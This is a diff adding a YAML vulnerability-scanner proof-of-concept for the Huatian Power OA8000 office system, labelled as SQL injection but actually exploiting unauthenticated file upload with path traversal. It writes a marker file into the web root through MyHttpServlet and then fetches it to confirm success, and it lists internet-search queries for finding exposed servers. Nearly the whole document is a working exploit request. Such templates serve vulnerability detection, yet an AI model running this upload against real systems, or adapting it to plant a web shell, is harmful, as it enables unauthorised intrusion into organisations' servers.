@@ -1,0 +1,59 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="华天动力-OA8000"
+    hunter-query: app.name="华天软件 OA"
+    quake-query: app:"华天动力OA"
+    zoomeye-query: app:"CNPOWER OA"
+    threatbook-query:
+    cve: 
+    cnvd:
+    tips:  /4ndex.txt  |  绝对路径   E:/htoa/Tomcat/webapps/ROOT/4ndex.txt
+    
+name: poc-yaml-huatian-8000-MyHttpServlet-admin-upload-sqli
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+
+rules:
+  r0:
+    request:
+      method: POST
+      cache: true
+      path: /OAapp/MyHttpServlet?username=admin
+      follow_redirects: false      
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{s2}}
+        Accept-Encoding: gzip, deflate
+      body: "------WebKitFormBoundary{{s2}}\r\nContent-Disposition: form-data; name=\"file\";filename=\"../../../../../../webapps/ROOT/4ndex.txt\"\r\n\r\n4ra1n\r\n------WebKitFormBoundary{{s2}}--"
+    expression: >-
+      response.status == 200 && response.body_string.contains("admin") && response.body_string.contains("state=SUCCESS")
+
+    output:
+      search: |-
+        "(?P<filename>\\w+.jsp)".bsubmatch(response.body)
+      filename: search["filename"]
+      search1: |-
+        "(?P<newpath>ico.*jsp)".bsubmatch(response.body)
+      newpath: search["newpath"]
+
+  r1:
+    request:
+      method: GET
+      cache: true
+      path: /4ndex.txt
+      follow_redirects: false      
+      headers:
+      body:
+    expression: >-
+      response.status == 200 && response.body_string.contains("4ra1n") 
+
+expression: r0() &&  r1()
